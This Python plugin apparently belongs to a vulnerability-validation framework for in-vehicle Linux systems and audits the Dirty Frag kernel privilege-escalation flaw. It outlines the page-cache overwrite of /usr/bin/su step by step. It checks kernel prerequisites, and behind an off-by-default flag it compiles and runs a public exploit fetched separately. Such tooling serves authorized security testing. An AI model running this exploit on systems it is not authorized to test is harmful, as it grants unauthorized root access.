#!/usr/bin/env python3
"""CVE-2026-43284 – Dirty Frag (xfrm-ESP): splice() injects read-only page cache into UDP skb frag; ESP input skips skb_cow_data() → authencesn writes 4 bytes into page cache of setuid binary.

Public PoC source: https://github.com/V4bel/dirtyfrag
  Files: ['exploit/exp.c']
  Technique:
    1. unshare(CLONE_NEWUSER|CLONE_NEWNET) to gain CAP_NET_ADMIN in net namespace.
    2. Register 48 XFRM ESP-in-UDP SAs each with distinct spi and seq_hi = target payload byte.
    3. splice(/usr/bin/su → pipe → UDP socket); ESP input sees non-cloned skb with SKBFL_SHARED_FRAG
       unset → skips skb_cow_data() → authencesn stores seq_hi 4-bytes into page cache.
    4. Repeat 48× (192 bytes total) to overwrite /usr/bin/su page cache with x86_64 root-shell ELF.
    5. execve(/usr/bin/su) → root (CVSS 8.8 HIGH).

Reference: https://nvd.nist.gov/vuln/detail/CVE-2026-43284
  Write-up: https://github.com/V4bel/dirtyfrag/blob/master/assets/write-up.md
"""
from __future__ import annotations

import re
import subprocess
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 51,
    "cve": "CVE-2026-43284",
    "year": 2026,
    "domain": "advanced",
    "vendor_product": "Linux kernel ≥4.11 (IVI/边缘 Linux 节点)",
    "component": "Linux kernel net/ipv4/esp4.c + net/ipv6/esp6.c – UDP datagram SKBFL_SHARED_FRAG missing",
    "type": "本地权限提升 (LPE) → root / CVSS 8.8 HIGH",
    "summary": (
        "Dirty Frag CVE-2026-43284: IPv4/IPv6 UDP datagram append 路径在 splice() 零拷贝时未标记 "
        "SKBFL_SHARED_FRAG，ESP input 走 no-COW 快路径对 page cache 做原地解密，"
        "authencesn 把 4 字节 seq_hi 写入只读文件页缓存。"
        "影响 Linux ≥4.11；车载 Linux IVI/边缘节点均在受影响范围。"
    ),
    "source_url": "https://github.com/V4bel/dirtyfrag",
    "requires_manual_review": True,
    "affected": [
        {
            "vendor": "Linux",
            "product": "Linux kernel",
            "versions": [{"version": "4.11", "status": "affected", "lessThan": "patched-f4c50a4034e6"}],
        }
    ],
}

POC_REPO = (
    Path(__file__).parent.parent.parent
    / "public_poc_sources/repos/V4bel__dirtyfrag"
)


def _check_version() -> dict:
    result: dict = {}
    try:
        r = subprocess.run(["uname", "-r"], capture_output=True, text=True, timeout=5)
        kver = r.stdout.strip()
        result["kernel_version"] = kver

        # Affected from 4.11 until fix commit f4c50a4034e6 (2026-05-08)
        m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", kver)
        if m:
            major, minor = int(m.group(1)), int(m.group(2))
            result["version_in_affected_range"] = major > 4 or (major == 4 and minor >= 11)

        # Check esp4/esp6 modules
        lsmod = subprocess.run("lsmod", capture_output=True, text=True, timeout=5)
        result["esp4_loaded"] = "esp4" in lsmod.stdout
        result["esp6_loaded"] = "esp6" in lsmod.stdout

        # Check user namespace
        userns = Path("/proc/sys/user/max_user_namespaces")
        result["user_namespace_max"] = userns.read_text().strip() if userns.exists() else "unknown"
        result["user_namespace_enabled"] = (
            result["user_namespace_max"] not in ("0", "unknown")
        )

        # Check patch presence via /proc/kallsyms skb_has_shared_frag (patched kernels add this)
        ks = Path("/proc/kallsyms")
        if ks.exists():
            out = subprocess.run(
                "grep skb_has_shared_frag /proc/kallsyms",
                shell=True, capture_output=True, text=True, timeout=5,
            )
            result["patch_symbol_present"] = bool(out.stdout.strip())
        else:
            result["patch_symbol_present"] = None

    except Exception as exc:
        result["check_error"] = str(exc)
    return result


def _compile_and_run(allow_disruptive: bool, lab_cmd: str) -> dict:
    result: dict = {}
    exp_c = POC_REPO / "exploit/exp.c"

    if not exp_c.exists():
        result["poc_repo_missing"] = str(POC_REPO)
        result["detail"] = (
            "Clone https://github.com/V4bel/dirtyfrag into "
            "public_poc_sources/repos/V4bel__dirtyfrag. "
            "Build: cd exploit && gcc -O2 -Wall -o dirtyfrag-exp exp.c && ./dirtyfrag-exp"
        )
        result["would_compile"] = "gcc -O2 -Wall -o dirtyfrag-exp exp.c"
        result["would_run"] = "./dirtyfrag-exp"
        return result

    if not allow_disruptive:
        result["would_compile"] = "gcc -O2 -Wall -o dirtyfrag-exp exp.c"
        result["would_run"] = "./dirtyfrag-exp"
        result["detail"] = (
            "Set allow_disruptive=true to compile and run Dirty Frag PoC. "
            "WARNING: Overwrites /usr/bin/su page cache with root-shell ELF. "
            "CVSS 8.8 HIGH. Isolated VM required."
        )
        return result

    with tempfile.TemporaryDirectory() as tmpdir:
        import shutil
        shutil.copy2(str(exp_c), f"{tmpdir}/exp.c")
        r = subprocess.run(
            "gcc -O2 -Wall -o dirtyfrag-exp exp.c",
            shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=60,
        )
        result["compile_rc"] = r.returncode
        result["compile_out"] = (r.stdout + r.stderr)[:400]
        if r.returncode != 0:
            result["detail"] = "Compile failed."
            return result

        r2 = subprocess.run(
            f"./dirtyfrag-exp; {lab_cmd}",
            shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=180,
        )
        result["run_rc"] = r2.returncode
        result["run_out"] = (r2.stdout + r2.stderr)[:600]
        result["exploited"] = (
            "uid=0" in r2.stdout
            or "root" in r2.stdout.lower()
            or "BUG:" in r2.stdout
        )
    return result


def _run_poc(plugin) -> dict:
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))
    # Never accept a client-provided local command. The fixed identity probe is
    # sufficient to record the post-exploit privilege level.
    lab_cmd = "id"

    evidence: dict = {
        "cve": "CVE-2026-43284",
        "poc_repo": str(POC_REPO),
        "poc_repo_present": (POC_REPO / "exploit/exp.c").exists(),
        "exploit_files": ["exploit/exp.c"],
        "technique": (
            "unshare NEWUSER+NEWNET → register 48 XFRM ESP-in-UDP SAs with seq_hi=payload_byte "
            "→ splice(/usr/bin/su → pipe → UDP socket) "
            "→ ESP input skips skb_cow_data() → authencesn STORE 4-byte seq_hi into page cache "
            "→ repeat 48x → execve(/usr/bin/su) → root (CVSS 8.8)."
        ),
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-43284",
        "write_up": "https://github.com/V4bel/dirtyfrag/blob/master/assets/write-up.md",
    }

    ver = _check_version()
    evidence.update(ver)
    exploit = _compile_and_run(allow_disruptive, lab_cmd)
    evidence.update(exploit)

    # Heuristic: patch symbol means kernel is fixed
    if evidence.get("patch_symbol_present"):
        evidence["likely_patched"] = True
        vulnerable = False
    elif evidence.get("version_in_affected_range") and evidence.get("user_namespace_enabled"):
        vulnerable = evidence.get("exploited")  # None = inconclusive
    else:
        vulnerable = False

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "https://github.com/V4bel/dirtyfrag",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc51CVE202643284DirtyFragXfrmESPLpeAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "poc_lab_vehicle"
    meta_display_id = "POC-ADV-051"
    meta_poc_name = 'CVE-2026-43284 Dirty Frag ESP Privilege Escalation Active Validation'
    meta_cve_id = "CVE-2026-43284"
    meta_severity = "Critical"
    meta_protocol = "local"
    meta_target_os = ["linux"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive", "lab_command"]
    meta_profiles = ["advanced", "kernel", "pagecache", "xfrm"]
    meta_source_url = "https://github.com/V4bel/dirtyfrag"
    meta_references       = ['https://github.com/V4bel/dirtyfrag']
    meta_attack_surface = (
        "本地非特权用户通过 splice + ESP-in-UDP xfrm 路径污染 setuid 二进制 page cache → root"
    )
    is_disruptive = True
    meta_destructive_level = "RootCompromise"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "51_Linux_Kernel_DirtyFrag_xfrm_ESP_LPE_Audit") if "VULN" in dir() else "51_Linux_Kernel_DirtyFrag_xfrm_ESP_LPE_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc51CVE202643284DirtyFragXfrmESPLpeAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
